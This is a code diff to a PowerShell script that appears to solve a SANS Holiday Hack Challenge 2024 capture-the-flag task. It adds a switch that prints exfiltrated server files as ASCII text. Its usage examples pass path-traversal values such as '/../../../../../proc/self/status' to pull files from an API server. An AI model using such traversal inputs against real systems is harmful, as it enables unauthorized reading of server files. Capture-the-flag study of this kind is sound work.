@@ -39,6 +39,10 @@
 
         Required attempt exfiltration of file from the api server.
 
+    .PARAMETER DumpFileAsText
+
+        Optional dump the file to the console as text.
+
     .EXAMPLE
 
         .\14-frostbit-decrypt-exfiltrate.ps1 `
@@ -52,6 +56,14 @@
         -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c `
         -Nonce c97b647f99cb744a `
         -FileToExfiltrate "/../../../../../proc/self/status"
+
+    .EXAMPLE
+
+        .\14-frostbit-decrypt-exfiltrate.ps1 `
+        -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c `
+        -Nonce c97b647f99cb744a `
+        -FileToExfiltrate "/../../../../../proc/1/mountinfo"
+        -DumpFileAsText
 
     .LINK
         https://www.sans.org/mlp/holiday-hack-challenge-2024/
@@ -68,7 +80,10 @@ param(
     [String]$NonceHex,
 
     [Parameter(Mandatory=$true)]
-    [String]$FileToExfiltrate
+    [String]$FileToExfiltrate,
+
+    [Parameter(Mandatory=$false)]
+    [switch]$DumpFileAsText
 )
 
 function Is-UUID {
@@ -161,7 +176,12 @@ $found = $false
         "File length:      " + $filelen
         "File hexdump:"
         $exfil | Format-Hex
-        "`nFile text: `n" + ($exfil -replace [char]0x0, " ")
+
+        if($DumpFileAsText){
+            $exfil = $exfil -replace [char]0x0, " "
+            $exfil = [System.Text.RegularExpressions.Regex]::Replace($exfil, "[^\u0020-\u007E]", "")
+            "`nFile text (ascii only and nulls replaced with space): `n" + $exfil
+        }
     }
     if($found -eq $true){
         break
